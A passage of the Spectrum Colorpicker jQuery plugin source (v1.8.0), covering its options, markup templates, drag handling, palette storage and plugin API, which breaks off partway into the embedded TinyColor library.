// Spectrum Colorpicker v1.8.0
// https://github.com/bgrins/spectrum
// Author: Brian Grinstead
// License: MIT

(function (factory) {
    "use strict";

    if (typeof define === 'function' && define.amd) { // AMD
        define(['jquery'], factory);
    }
    else if (typeof exports == "object" && typeof module == "object") { // CommonJS
        module.exports = factory(require('jquery'));
    }
    else { // Browser
        factory(jQuery);
    }
})(function($, undefined) {
    "use strict";

    var defaultOpts = {

        // Callbacks
        beforeShow: noop,
        move: noop,
        change: noop,
        show: noop,
        hide: noop,

        // Options
        color: false,
        flat: false,
        showInput: false,
        allowEmpty: false,
        showButtons: true,
        clickoutFiresChange: true,
        showInitial: false,
        showPalette: false,
        showPaletteOnly: false,
        hideAfterPaletteSelect: false,
        togglePaletteOnly: false,
        showSelectionPalette: true,
        localStorageKey: false,
        appendTo: "body",
        maxSelectionSize: 7,
        cancelText: "cancel",
        chooseText: "choose",
        togglePaletteMoreText: "more",
        togglePaletteLessText: "less",
        clearText: "Clear Color Selection",
        noColorSelectedText: "No Color Selected",
        preferredFormat: false,
        className: "", // Deprecated - use containerClassName and replacerClassName instead.
        containerClassName: "",
        replacerClassName: "",
        showAlpha: false,
        theme: "sp-light",
        palette: [["#ffffff", "#000000", "#ff0000", "#ff8000", "#ffff00", "#008000", "#0000ff", "#4b0082", "#9400d3"]],
        selectionPalette: [],
        disabled: false,
        offset: null
    },
    spectrums = [],
    IE = !!/msie/i.exec( window.navigator.userAgent ),
    rgbaSupport = (function() {
        function contains( str, substr ) {
            return !!~('' + str).indexOf(substr);
        }

        var elem = document.createElement('div');
        var style = elem.style;
        style.cssText = 'background-color:rgba(0,0,0,.5)';
        return contains(style.backgroundColor, 'rgba') || contains(style.backgroundColor, 'hsla');
    })(),
    replaceInput = [
        "<div class='sp-replacer'>",
            "<div class='sp-preview'><div class='sp-preview-inner'></div></div>",
            "<div class='sp-dd'>&#9660;</div>",
        "</div>"
    ].join(''),
    markup = (function () {

        // IE does not support gradients with multiple stops, so we need to simulate
        //  that for the rainbow slider with 8 divs that each have a single gradient
        var gradientFix = "";
        if (IE) {
            for (var i = 1; i <= 6; i++) {
                gradientFix += "<div class='sp-" + i + "'></div>";
            }
        }

        return [
            "<div class='sp-container sp-hidden'>",
                "<div class='sp-palette-container'>",
                    "<div class='sp-palette sp-thumb sp-cf'></div>",
                    "<div class='sp-palette-button-container sp-cf'>",
                        "<button type='button' class='sp-palette-toggle'></button>",
                    "</div>",
                "</div>",
                "<div class='sp-picker-container'>",
                    "<div class='sp-top sp-cf'>",
                        "<div class='sp-fill'></div>",
                        "<div class='sp-top-inner'>",
                            "<div class='sp-color'>",
                                "<div class='sp-sat'>",
                                    "<div class='sp-val'>",
                                        "<div class='sp-dragger'></div>",
                                    "</div>",
                                "</div>",
                            "</div>",
                            "<div class='sp-clear sp-clear-display'>",
                            "</div>",
                            "<div class='sp-hue'>",
                                "<div class='sp-slider'></div>",
                                gradientFix,
                            "</div>",
                        "</div>",
                        "<div class='sp-alpha'><div class='sp-alpha-inner'><div class='sp-alpha-handle'></div></div></div>",
                    "</div>",
                    "<div class='sp-input-container sp-cf'>",
                        "<input class='sp-input' type='text' spellcheck='false'  />",
                    "</div>",
                    "<div class='sp-initial sp-thumb sp-cf'></div>",
                    "<div class='sp-button-container sp-cf'>",
                        "<a class='sp-cancel' href='#'></a>",
                        "<button type='button' class='sp-choose'></button>",
                    "</div>",
                "</div>",
            "</div>"
        ].join("");
    })();

    function paletteTemplate (p, color, className, opts) {
        var html = [];
        for (var i = 0; i < p.length; i++) {
            var current = p[i];
            if(current) {
                var tiny = tinycolor(current);
                var c = tiny.toHsl().l < 0.5 ? "sp-thumb-el sp-thumb-dark" : "sp-thumb-el sp-thumb-light";
                c += (tinycolor.equals(color, current)) ? " sp-thumb-active" : "";
                var formattedString = tiny.toString(opts.preferredFormat || "rgb");
                var swatchStyle = rgbaSupport ? ("background-color:" + tiny.toRgbString()) : "filter:" + tiny.toFilter();
                html.push('<span title="' + formattedString + '" data-color="' + tiny.toRgbString() + '" class="' + c + '"><span class="sp-thumb-inner" style="' + swatchStyle + ';" /></span>');
            } else {
                var cls = 'sp-clear-display';
                html.push($('<div />')
                    .append($('<span data-color="" style="background-color:transparent;" class="' + cls + '"></span>')
                        .attr('title', opts.noColorSelectedText)
                    )
                    .html()
                );
            }
        }
        return "<div class='sp-cf " + className + "'>" + html.join('') + "</div>";
    }

    function hideAll() {
        for (var i = 0; i < spectrums.length; i++) {
            if (spectrums[i]) {
                spectrums[i].hide();
            }
        }
    }

    function instanceOptions(o, callbackContext) {
        var opts = $.extend({}, defaultOpts, o);
        opts.callbacks = {
            'move': bind(opts.move, callbackContext),
            'change': bind(opts.change, callbackContext),
            'show': bind(opts.show, callbackContext),
            'hide': bind(opts.hide, callbackContext),
            'beforeShow': bind(opts.beforeShow, callbackContext)
        };

        return opts;
    }

    function spectrum(element, o) {

        var opts = instanceOptions(o, element),
            flat = opts.flat,
            showSelectionPalette = opts.showSelectionPalette,
            localStorageKey = opts.localStorageKey,
            theme = opts.theme,
            callbacks = opts.callbacks,
            resize = throttle(reflow, 10),
            visible = false,
            isDragging = false,
            dragWidth = 0,
            dragHeight = 0,
            dragHelperHeight = 0,
            slideHeight = 0,
            slideWidth = 0,
            alphaWidth = 0,
            alphaSlideHelperWidth = 0,
            slideHelperHeight = 0,
            currentHue = 0,
            currentSaturation = 0,
            currentValue = 0,
            currentAlpha = 1,
            palette = [],
            paletteArray = [],
            paletteLookup = {},
            selectionPalette = opts.selectionPalette.slice(0),
            maxSelectionSize = opts.maxSelectionSize,
            draggingClass = "sp-dragging",
            shiftMovementDirection = null;

        var doc = element.ownerDocument,
            body = doc.body,
            boundElement = $(element),
            disabled = false,
            container = $(markup, doc).addClass(theme),
            pickerContainer = container.find(".sp-picker-container"),
            dragger = container.find(".sp-color"),
            dragHelper = container.find(".sp-dragger"),
            slider = container.find(".sp-hue"),
            slideHelper = container.find(".sp-slider"),
            alphaSliderInner = container.find(".sp-alpha-inner"),
            alphaSlider = container.find(".sp-alpha"),
            alphaSlideHelper = container.find(".sp-alpha-handle"),
            textInput = container.find(".sp-input"),
            paletteContainer = container.find(".sp-palette"),
            initialColorContainer = container.find(".sp-initial"),
            cancelButton = container.find(".sp-cancel"),
            clearButton = container.find(".sp-clear"),
            chooseButton = container.find(".sp-choose"),
            toggleButton = container.find(".sp-palette-toggle"),
            isInput = boundElement.is("input"),
            isInputTypeColor = isInput && boundElement.attr("type") === "color" && inputTypeColorSupport(),
            shouldReplace = isInput && !flat,
            replacer = (shouldReplace) ? $(replaceInput).addClass(theme).addClass(opts.className).addClass(opts.replacerClassName) : $([]),
            offsetElement = (shouldReplace) ? replacer : boundElement,
            previewElement = replacer.find(".sp-preview-inner"),
            initialColor = opts.color || (isInput && boundElement.val()),
            colorOnShow = false,
            currentPreferredFormat = opts.preferredFormat,
            clickoutFiresChange = !opts.showButtons || opts.clickoutFiresChange,
            isEmpty = !initialColor,
            allowEmpty = opts.allowEmpty && !isInputTypeColor;

        function applyOptions() {

            if (opts.showPaletteOnly) {
                opts.showPalette = true;
            }

            toggleButton.text(opts.showPaletteOnly ? opts.togglePaletteMoreText : opts.togglePaletteLessText);

            if (opts.palette) {
                palette = opts.palette.slice(0);
                paletteArray = $.isArray(palette[0]) ? palette : [palette];
                paletteLookup = {};
                for (var i = 0; i < paletteArray.length; i++) {
                    for (var j = 0; j < paletteArray[i].length; j++) {
                        var rgb = tinycolor(paletteArray[i][j]).toRgbString();
                        paletteLookup[rgb] = true;
                    }
                }
            }

            container.toggleClass("sp-flat", flat);
            container.toggleClass("sp-input-disabled", !opts.showInput);
            container.toggleClass("sp-alpha-enabled", opts.showAlpha);
            container.toggleClass("sp-clear-enabled", allowEmpty);
            container.toggleClass("sp-buttons-disabled", !opts.showButtons);
            container.toggleClass("sp-palette-buttons-disabled", !opts.togglePaletteOnly);
            container.toggleClass("sp-palette-disabled", !opts.showPalette);
            container.toggleClass("sp-palette-only", opts.showPaletteOnly);
            container.toggleClass("sp-initial-disabled", !opts.showInitial);
            container.addClass(opts.className).addClass(opts.containerClassName);

            reflow();
        }

        function initialize() {

            if (IE) {
                container.find("*:not(input)").attr("unselectable", "on");
            }

            applyOptions();

            if (shouldReplace) {
                boundElement.after(replacer).hide();
            }

            if (!allowEmpty) {
                clearButton.hide();
            }

            if (flat) {
                boundElement.after(container).hide();
            }
            else {

                var appendTo = opts.appendTo === "parent" ? boundElement.parent() : $(opts.appendTo);
                if (appendTo.length !== 1) {
                    appendTo = $("body");
                }

                appendTo.append(container);
            }

            updateSelectionPaletteFromStorage();

            offsetElement.bind("click.spectrum touchstart.spectrum", function (e) {
                if (!disabled) {
                    toggle();
                }

                e.stopPropagation();

                if (!$(e.target).is("input")) {
                    e.preventDefault();
                }
            });

            if(boundElement.is(":disabled") || (opts.disabled === true)) {
                disable();
            }

            // Prevent clicks from bubbling up to document.  This would cause it to be hidden.
            container.click(stopPropagation);

            // Handle user typed input
            textInput.change(setFromTextInput);
            textInput.bind("paste", function () {
                setTimeout(setFromTextInput, 1);
            });
            textInput.keydown(function (e) { if (e.keyCode == 13) { setFromTextInput(); } });

            cancelButton.text(opts.cancelText);
            cancelButton.bind("click.spectrum", function (e) {
                e.stopPropagation();
                e.preventDefault();
                revert();
                hide();
            });

            clearButton.attr("title", opts.clearText);
            clearButton.bind("click.spectrum", function (e) {
                e.stopPropagation();
                e.preventDefault();
                isEmpty = true;
                move();

                if(flat) {
                    //for the flat style, this is a change event
                    updateOriginalInput(true);
                }
            });

            chooseButton.text(opts.chooseText);
            chooseButton.bind("click.spectrum", function (e) {
                e.stopPropagation();
                e.preventDefault();

                if (IE && textInput.is(":focus")) {
                    textInput.trigger('change');
                }

                if (isValid()) {
                    updateOriginalInput(true);
                    hide();
                }
            });

            toggleButton.text(opts.showPaletteOnly ? opts.togglePaletteMoreText : opts.togglePaletteLessText);
            toggleButton.bind("click.spectrum", function (e) {
                e.stopPropagation();
                e.preventDefault();

                opts.showPaletteOnly = !opts.showPaletteOnly;

                // To make sure the Picker area is drawn on the right, next to the
                // Palette area (and not below the palette), first move the Palette
                // to the left to make space for the picker, plus 5px extra.
                // The 'applyOptions' function puts the whole container back into place
                // and takes care of the button-text and the sp-palette-only CSS class.
                if (!opts.showPaletteOnly && !flat) {
                    container.css('left', '-=' + (pickerContainer.outerWidth(true) + 5));
                }
                applyOptions();
            });

            draggable(alphaSlider, function (dragX, dragY, e) {
                currentAlpha = (dragX / alphaWidth);
                isEmpty = false;
                if (e.shiftKey) {
                    currentAlpha = Math.round(currentAlpha * 10) / 10;
                }

                move();
            }, dragStart, dragStop);

            draggable(slider, function (dragX, dragY) {
                currentHue = parseFloat(dragY / slideHeight);
                isEmpty = false;
                if (!opts.showAlpha) {
                    currentAlpha = 1;
                }
                move();
            }, dragStart, dragStop);

            draggable(dragger, function (dragX, dragY, e) {

                // shift+drag should snap the movement to either the x or y axis.
                if (!e.shiftKey) {
                    shiftMovementDirection = null;
                }
                else if (!shiftMovementDirection) {
                    var oldDragX = currentSaturation * dragWidth;
                    var oldDragY = dragHeight - (currentValue * dragHeight);
                    var furtherFromX = Math.abs(dragX - oldDragX) > Math.abs(dragY - oldDragY);

                    shiftMovementDirection = furtherFromX ? "x" : "y";
                }

                var setSaturation = !shiftMovementDirection || shiftMovementDirection === "x";
                var setValue = !shiftMovementDirection || shiftMovementDirection === "y";

                if (setSaturation) {
                    currentSaturation = parseFloat(dragX / dragWidth);
                }
                if (setValue) {
                    currentValue = parseFloat((dragHeight - dragY) / dragHeight);
                }

                isEmpty = false;
                if (!opts.showAlpha) {
                    currentAlpha = 1;
                }

                move();

            }, dragStart, dragStop);

            if (!!initialColor) {
                set(initialColor);

                // In case color was black - update the preview UI and set the format
                // since the set function will not run (default color is black).
                updateUI();
                currentPreferredFormat = opts.preferredFormat || tinycolor(initialColor).format;

                addColorToSelectionPalette(initialColor);
            }
            else {
                updateUI();
            }

            if (flat) {
                show();
            }

            function paletteElementClick(e) {
                if (e.data && e.data.ignore) {
                    set($(e.target).closest(".sp-thumb-el").data("color"));
                    move();
                }
                else {
                    set($(e.target).closest(".sp-thumb-el").data("color"));
                    move();
                    updateOriginalInput(true);
                    if (opts.hideAfterPaletteSelect) {
                      hide();
                    }
                }

                return false;
            }

            var paletteEvent = IE ? "mousedown.spectrum" : "click.spectrum touchstart.spectrum";
            paletteContainer.delegate(".sp-thumb-el", paletteEvent, paletteElementClick);
            initialColorContainer.delegate(".sp-thumb-el:nth-child(1)", paletteEvent, { ignore: true }, paletteElementClick);
        }

        function updateSelectionPaletteFromStorage() {

            if (localStorageKey && window.localStorage) {

                // Migrate old palettes over to new format.  May want to remove this eventually.
                try {
                    var oldPalette = window.localStorage[localStorageKey].split(",#");
                    if (oldPalette.length > 1) {
                        delete window.localStorage[localStorageKey];
                        $.each(oldPalette, function(i, c) {
                             addColorToSelectionPalette(c);
                        });
                    }
                }
                catch(e) { }

                try {
                    selectionPalette = window.localStorage[localStorageKey].split(";");
                }
                catch (e) { }
            }
        }

        function addColorToSelectionPalette(color) {
            if (showSelectionPalette) {
                var rgb = tinycolor(color).toRgbString();
                if (!paletteLookup[rgb] && $.inArray(rgb, selectionPalette) === -1) {
                    selectionPalette.push(rgb);
                    while(selectionPalette.length > maxSelectionSize) {
                        selectionPalette.shift();
                    }
                }

                if (localStorageKey && window.localStorage) {
                    try {
                        window.localStorage[localStorageKey] = selectionPalette.join(";");
                    }
                    catch(e) { }
                }
            }
        }

        function getUniqueSelectionPalette() {
            var unique = [];
            if (opts.showPalette) {
                for (var i = 0; i < selectionPalette.length; i++) {
                    var rgb = tinycolor(selectionPalette[i]).toRgbString();

                    if (!paletteLookup[rgb]) {
                        unique.push(selectionPalette[i]);
                    }
                }
            }

            return unique.reverse().slice(0, opts.maxSelectionSize);
        }

        function drawPalette() {

            var currentColor = get();

            var html = $.map(paletteArray, function (palette, i) {
                return paletteTemplate(palette, currentColor, "sp-palette-row sp-palette-row-" + i, opts);
            });

            updateSelectionPaletteFromStorage();

            if (selectionPalette) {
                html.push(paletteTemplate(getUniqueSelectionPalette(), currentColor, "sp-palette-row sp-palette-row-selection", opts));
            }

            paletteContainer.html(html.join(""));
        }

        function drawInitial() {
            if (opts.showInitial) {
                var initial = colorOnShow;
                var current = get();
                initialColorContainer.html(paletteTemplate([initial, current], current, "sp-palette-row-initial", opts));
            }
        }

        function dragStart() {
            if (dragHeight <= 0 || dragWidth <= 0 || slideHeight <= 0) {
                reflow();
            }
            isDragging = true;
            container.addClass(draggingClass);
            shiftMovementDirection = null;
            boundElement.trigger('dragstart.spectrum', [ get() ]);
        }

        function dragStop() {
            isDragging = false;
            container.removeClass(draggingClass);
            boundElement.trigger('dragstop.spectrum', [ get() ]);
        }

        function setFromTextInput() {

            var value = textInput.val();

            if ((value === null || value === "") && allowEmpty) {
                set(null);
                updateOriginalInput(true);
            }
            else {
                var tiny = tinycolor(value);
                if (tiny.isValid()) {
                    set(tiny);
                    updateOriginalInput(true);
                }
                else {
                    textInput.addClass("sp-validation-error");
                }
            }
        }

        function toggle() {
            if (visible) {
                hide();
            }
            else {
                show();
            }
        }

        function show() {
            var event = $.Event('beforeShow.spectrum');

            if (visible) {
                reflow();
                return;
            }

            boundElement.trigger(event, [ get() ]);

            if (callbacks.beforeShow(get()) === false || event.isDefaultPrevented()) {
                return;
            }

            hideAll();
            visible = true;

            $(doc).bind("keydown.spectrum", onkeydown);
            $(doc).bind("click.spectrum", clickout);
            $(window).bind("resize.spectrum", resize);
            replacer.addClass("sp-active");
            container.removeClass("sp-hidden");

            reflow();
            updateUI();

            colorOnShow = get();

            drawInitial();
            callbacks.show(colorOnShow);
            boundElement.trigger('show.spectrum', [ colorOnShow ]);
        }

        function onkeydown(e) {
            // Close on ESC
            if (e.keyCode === 27) {
                hide();
            }
        }

        function clickout(e) {
            // Return on right click.
            if (e.button == 2) { return; }

            // If a drag event was happening during the mouseup, don't hide
            // on click.
            if (isDragging) { return; }

            if (clickoutFiresChange) {
                updateOriginalInput(true);
            }
            else {
                revert();
            }
            hide();
        }

        function hide() {
            // Return if hiding is unnecessary
            if (!visible || flat) { return; }
            visible = false;

            $(doc).unbind("keydown.spectrum", onkeydown);
            $(doc).unbind("click.spectrum", clickout);
            $(window).unbind("resize.spectrum", resize);

            replacer.removeClass("sp-active");
            container.addClass("sp-hidden");

            callbacks.hide(get());
            boundElement.trigger('hide.spectrum', [ get() ]);
        }

        function revert() {
            set(colorOnShow, true);
        }

        function set(color, ignoreFormatChange) {
            if (tinycolor.equals(color, get())) {
                // Update UI just in case a validation error needs
                // to be cleared.
                updateUI();
                return;
            }

            var newColor, newHsv;
            if (!color && allowEmpty) {
                isEmpty = true;
            } else {
                isEmpty = false;
                newColor = tinycolor(color);
                newHsv = newColor.toHsv();

                currentHue = (newHsv.h % 360) / 360;
                currentSaturation = newHsv.s;
                currentValue = newHsv.v;
                currentAlpha = newHsv.a;
            }
            updateUI();

            if (newColor && newColor.isValid() && !ignoreFormatChange) {
                currentPreferredFormat = opts.preferredFormat || newColor.getFormat();
            }
        }

        function get(opts) {
            opts = opts || { };

            if (allowEmpty && isEmpty) {
                return null;
            }

            return tinycolor.fromRatio({
                h: currentHue,
                s: currentSaturation,
                v: currentValue,
                a: Math.round(currentAlpha * 100) / 100
            }, { format: opts.format || currentPreferredFormat });
        }

        function isValid() {
            return !textInput.hasClass("sp-validation-error");
        }

        function move() {
            updateUI();

            callbacks.move(get());
            boundElement.trigger('move.spectrum', [ get() ]);
        }

        function updateUI() {

            textInput.removeClass("sp-validation-error");

            updateHelperLocations();

            // Update dragger background color (gradients take care of saturation and value).
            var flatColor = tinycolor.fromRatio({ h: currentHue, s: 1, v: 1 });
            dragger.css("background-color", flatColor.toHexString());

            // Get a format that alpha will be included in (hex and names ignore alpha)
            var format = currentPreferredFormat;
            if (currentAlpha < 1 && !(currentAlpha === 0 && format === "name")) {
                if (format === "hex" || format === "hex3" || format === "hex6" || format === "name") {
                    format = "rgb";
                }
            }

            var realColor = get({ format: format }),
                displayColor = '';

             //reset background info for preview element
            previewElement.removeClass("sp-clear-display");
            previewElement.css('background-color', 'transparent');

            if (!realColor && allowEmpty) {
                // Update the replaced elements background with icon indicating no color selection
                previewElement.addClass("sp-clear-display");
            }
            else {
                var realHex = realColor.toHexString(),
                    realRgb = realColor.toRgbString();

                // Update the replaced elements background color (with actual selected color)
                if (rgbaSupport || realColor.alpha === 1) {
                    previewElement.css("background-color", realRgb);
                }
                else {
                    previewElement.css("background-color", "transparent");
                    previewElement.css("filter", realColor.toFilter());
                }

                if (opts.showAlpha) {
                    var rgb = realColor.toRgb();
                    rgb.a = 0;
                    var realAlpha = tinycolor(rgb).toRgbString();
                    var gradient = "linear-gradient(left, " + realAlpha + ", " + realHex + ")";

                    if (IE) {
                        alphaSliderInner.css("filter", tinycolor(realAlpha).toFilter({ gradientType: 1 }, realHex));
                    }
                    else {
                        alphaSliderInner.css("background", "-webkit-" + gradient);
                        alphaSliderInner.css("background", "-moz-" + gradient);
                        alphaSliderInner.css("background", "-ms-" + gradient);
                        // Use current syntax gradient on unprefixed property.
                        alphaSliderInner.css("background",
                            "linear-gradient(to right, " + realAlpha + ", " + realHex + ")");
                    }
                }

                displayColor = realColor.toString(format);
            }

            // Update the text entry input as it changes happen
            if (opts.showInput) {
                textInput.val(displayColor);
            }

            if (opts.showPalette) {
                drawPalette();
            }

            drawInitial();
        }

        function updateHelperLocations() {
            var s = currentSaturation;
            var v = currentValue;

            if(allowEmpty && isEmpty) {
                //if selected color is empty, hide the helpers
                alphaSlideHelper.hide();
                slideHelper.hide();
                dragHelper.hide();
            }
            else {
                //make sure helpers are visible
                alphaSlideHelper.show();
                slideHelper.show();
                dragHelper.show();

                // Where to show the little circle in that displays your current selected color
                var dragX = s * dragWidth;
                var dragY = dragHeight - (v * dragHeight);
                dragX = Math.max(
                    -dragHelperHeight,
                    Math.min(dragWidth - dragHelperHeight, dragX - dragHelperHeight)
                );
                dragY = Math.max(
                    -dragHelperHeight,
                    Math.min(dragHeight - dragHelperHeight, dragY - dragHelperHeight)
                );
                dragHelper.css({
                    "top": dragY + "px",
                    "left": dragX + "px"
                });

                var alphaX = currentAlpha * alphaWidth;
                alphaSlideHelper.css({
                    "left": (alphaX - (alphaSlideHelperWidth / 2)) + "px"
                });

                // Where to show the bar that displays your current selected hue
                var slideY = (currentHue) * slideHeight;
                slideHelper.css({
                    "top": (slideY - slideHelperHeight) + "px"
                });
            }
        }

        function updateOriginalInput(fireCallback) {
            var color = get(),
                displayColor = '',
                hasChanged = !tinycolor.equals(color, colorOnShow);

            if (color) {
                displayColor = color.toString(currentPreferredFormat);
                // Update the selection palette with the current color
                addColorToSelectionPalette(color);
            }

            if (isInput) {
                boundElement.val(displayColor);
            }

            if (fireCallback && hasChanged) {
                callbacks.change(color);
                boundElement.trigger('change', [ color ]);
            }
        }

        function reflow() {
            if (!visible) {
                return; // Calculations would be useless and wouldn't be reliable anyways
            }
            dragWidth = dragger.width();
            dragHeight = dragger.height();
            dragHelperHeight = dragHelper.height();
            slideWidth = slider.width();
            slideHeight = slider.height();
            slideHelperHeight = slideHelper.height();
            alphaWidth = alphaSlider.width();
            alphaSlideHelperWidth = alphaSlideHelper.width();

            if (!flat) {
                container.css("position", "absolute");
                if (opts.offset) {
                    container.offset(opts.offset);
                } else {
                    container.offset(getOffset(container, offsetElement));
                }
            }

            updateHelperLocations();

            if (opts.showPalette) {
                drawPalette();
            }

            boundElement.trigger('reflow.spectrum');
        }

        function destroy() {
            boundElement.show();
            offsetElement.unbind("click.spectrum touchstart.spectrum");
            container.remove();
            replacer.remove();
            spectrums[spect.id] = null;
        }

        function option(optionName, optionValue) {
            if (optionName === undefined) {
                return $.extend({}, opts);
            }
            if (optionValue === undefined) {
                return opts[optionName];
            }

            opts[optionName] = optionValue;

            if (optionName === "preferredFormat") {
                currentPreferredFormat = opts.preferredFormat;
            }
            applyOptions();
        }

        function enable() {
            disabled = false;
            boundElement.attr("disabled", false);
            offsetElement.removeClass("sp-disabled");
        }

        function disable() {
            hide();
            disabled = true;
            boundElement.attr("disabled", true);
            offsetElement.addClass("sp-disabled");
        }

        function setOffset(coord) {
            opts.offset = coord;
            reflow();
        }

        initialize();

        var spect = {
            show: show,
            hide: hide,
            toggle: toggle,
            reflow: reflow,
            option: option,
            enable: enable,
            disable: disable,
            offset: setOffset,
            set: function (c) {
                set(c);
                updateOriginalInput();
            },
            get: get,
            destroy: destroy,
            container: container
        };

        spect.id = spectrums.push(spect) - 1;

        return spect;
    }

    /**
    * checkOffset - get the offset below/above and left/right element depending on screen position
    * Thanks https://github.com/jquery/jquery-ui/blob/master/ui/jquery.ui.datepicker.js
    */
    function getOffset(picker, input) {
        var extraY = 0;
        var dpWidth = picker.outerWidth();
        var dpHeight = picker.outerHeight();
        var inputHeight = input.outerHeight();
        var doc = picker[0].ownerDocument;
        var docElem = doc.documentElement;
        var viewWidth = docElem.clientWidth + $(doc).scrollLeft();
        var viewHeight = docElem.clientHeight + $(doc).scrollTop();
        var offset = input.offset();
        offset.top += inputHeight;

        offset.left -=
            Math.min(offset.left, (offset.left + dpWidth > viewWidth && viewWidth > dpWidth) ?
            Math.abs(offset.left + dpWidth - viewWidth) : 0);

        offset.top -=
            Math.min(offset.top, ((offset.top + dpHeight > viewHeight && viewHeight > dpHeight) ?
            Math.abs(dpHeight + inputHeight - extraY) : extraY));

        return offset;
    }

    /**
    * noop - do nothing
    */
    function noop() {

    }

    /**
    * stopPropagation - makes the code only doing this a little easier to read in line
    */
    function stopPropagation(e) {
        e.stopPropagation();
    }

    /**
    * Create a function bound to a given object
    * Thanks to underscore.js
    */
    function bind(func, obj) {
        var slice = Array.prototype.slice;
        var args = slice.call(arguments, 2);
        return function () {
            return func.apply(obj, args.concat(slice.call(arguments)));
        };
    }

    /**
    * Lightweight drag helper.  Handles containment within the element, so that
    * when dragging, the x is within [0,element.width] and y is within [0,element.height]
    */
    function draggable(element, onmove, onstart, onstop) {
        onmove = onmove || function () { };
        onstart = onstart || function () { };
        onstop = onstop || function () { };
        var doc = document;
        var dragging = false;
        var offset = {};
        var maxHeight = 0;
        var maxWidth = 0;
        var hasTouch = ('ontouchstart' in window);

        var duringDragEvents = {};
        duringDragEvents["selectstart"] = prevent;
        duringDragEvents["dragstart"] = prevent;
        duringDragEvents["touchmove mousemove"] = move;
        duringDragEvents["touchend mouseup"] = stop;

        function prevent(e) {
            if (e.stopPropagation) {
                e.stopPropagation();
            }
            if (e.preventDefault) {
                e.preventDefault();
            }
            e.returnValue = false;
        }

        function move(e) {
            if (dragging) {
                // Mouseup happened outside of window
                if (IE && doc.documentMode < 9 && !e.button) {
                    return stop();
                }

                var t0 = e.originalEvent && e.originalEvent.touches && e.originalEvent.touches[0];
                var pageX = t0 && t0.pageX || e.pageX;
                var pageY = t0 && t0.pageY || e.pageY;

                var dragX = Math.max(0, Math.min(pageX - offset.left, maxWidth));
                var dragY = Math.max(0, Math.min(pageY - offset.top, maxHeight));

                if (hasTouch) {
                    // Stop scrolling in iOS
                    prevent(e);
                }

                onmove.apply(element, [dragX, dragY, e]);
            }
        }

        function start(e) {
            var rightclick = (e.which) ? (e.which == 3) : (e.button == 2);

            if (!rightclick && !dragging) {
                if (onstart.apply(element, arguments) !== false) {
                    dragging = true;
                    maxHeight = $(element).height();
                    maxWidth = $(element).width();
                    offset = $(element).offset();

                    $(doc).bind(duringDragEvents);
                    $(doc.body).addClass("sp-dragging");

                    move(e);

                    prevent(e);
                }
            }
        }

        function stop() {
            if (dragging) {
                $(doc).unbind(duringDragEvents);
                $(doc.body).removeClass("sp-dragging");

                // Wait a tick before notifying observers to allow the click event
                // to fire in Chrome.
                setTimeout(function() {
                    onstop.apply(element, arguments);
                }, 0);
            }
            dragging = false;
        }

        $(element).bind("touchstart mousedown", start);
    }

    function throttle(func, wait, debounce) {
        var timeout;
        return function () {
            var context = this, args = arguments;
            var throttler = function () {
                timeout = null;
                func.apply(context, args);
            };
            if (debounce) clearTimeout(timeout);
            if (debounce || !timeout) timeout = setTimeout(throttler, wait);
        };
    }

    function inputTypeColorSupport() {
        return $.fn.spectrum.inputTypeColorSupport();
    }

    /**
    * Define a jQuery plugin
    */
    var dataID = "spectrum.id";
    $.fn.spectrum = function (opts, extra) {

        if (typeof opts == "string") {

            var returnValue = this;
            var args = Array.prototype.slice.call( arguments, 1 );

            this.each(function () {
                var spect = spectrums[$(this).data(dataID)];
                if (spect) {
                    var method = spect[opts];
                    if (!method) {
                        throw new Error( "Spectrum: no such method: '" + opts + "'" );
                    }

                    if (opts == "get") {
                        returnValue = spect.get();
                    }
                    else if (opts == "container") {
                        returnValue = spect.container;
                    }
                    else if (opts == "option") {
                        returnValue = spect.option.apply(spect, args);
                    }
                    else if (opts == "destroy") {
                        spect.destroy();
                        $(this).removeData(dataID);
                    }
                    else {
                        method.apply(spect, args);
                    }
                }
            });

            return returnValue;
        }

        // Initializing a new instance of spectrum
        return this.spectrum("destroy").each(function () {
            var options = $.extend({}, opts, $(this).data());
            var spect = spectrum(this, options);
            $(this).data(dataID, spect.id);
        });
    };

    $.fn.spectrum.load = true;
    $.fn.spectrum.loadOpts = {};
    $.fn.spectrum.draggable = draggable;
    $.fn.spectrum.defaults = defaultOpts;
    $.fn.spectrum.inputTypeColorSupport = function inputTypeColorSupport() {
        if (typeof inputTypeColorSupport._cachedResult === "undefined") {
            var colorInput = $("<input type='color'/>")[0]; // if color element is supported, value will default to not null
            inputTypeColorSupport._cachedResult = colorInput.type === "color" && colorInput.value !== "";
        }
        return inputTypeColorSupport._cachedResult;
    };

    $.spectrum = { };
    $.spectrum.localization = { };
    $.spectrum.palettes = { };

    $.fn.spectrum.processNativeColorInputs = function () {
        var colorInputs = $("input[type=color]");
        if (colorInputs.length && !inputTypeColorSupport()) {
            colorInputs.spectrum({
                preferredFormat: "hex6"
            });
        }
    };

    // TinyColor v1.1.2
    // https://github.com/bgrins/TinyColor
    // Brian Grinstead, MIT License

    (function() {

    var trimLeft = /^[\s,#]+/,
        trimRight = /\s+$/,
        tinyCounter = 0,
        math = Math,
        mathRound = math.round,
        mathMin = math.min,
        mathMax = math.max,
        mathRandom = math.random;

    var tinycolor = function(color, opts) {

        color = (color) ? color : '';
        opts = opts || { };

        // If input is already a tinycolor, return itself
        if (color instanceof tinycolor) {
           return color;
        }
        // If we are called as a function, call using new instead
        if (!(this instanceof tinycolor)) {
            return new tinycolor(color, opts);
        }

        var rgb = inputToRGB(color);
        this._originalInput = color,
        this._r = rgb.r,
        this._g = rgb.g,
        this._b = rgb.b,
        this._a = rgb.a,
        this._roundA = mathRound(100*this._a) / 100,
        this._format = opts.format || rgb.format;
        this._gradientType = opts.gradientType;

        // Don't let the range of [0,255] come back in [0,1].
        // Potentially lose a little bit of precision here, but will fix issues where
        // .5 gets interpreted as half of the total, instead of half of 1
        // If it was supposed to be 128, this was already taken care of by `inputToRgb`
        if (this._r < 1) { this._r = mathRound(this._r); }
        if (this._g < 1) { this._g = mathRound(this._g); }
        if (this._b < 1) { this._b = mathRound(this._b); }

        this._ok = rgb.ok;
        this._tc_id = tinyCounter++;
    };

    tinycolor.prototype = {
        isDark: function() {
            return this.getBrightness() < 128;
        },
        isLight: function() {
            return !this.isDark();
        },
        isValid: function() {
            return this._ok;
        },
        getOriginalInput: function() {
          return this._originalInput;
        },
        getFormat: function() {
            return this._format;
        },
        getAlpha: function() {
            return this._a;
        },
        getBrightness: function() {
            var rgb = this.toRgb();
            return (rgb.r * 299 + rgb.g * 587 + rgb.b * 114) / 1000;
        },
        setAlpha: function(value) {
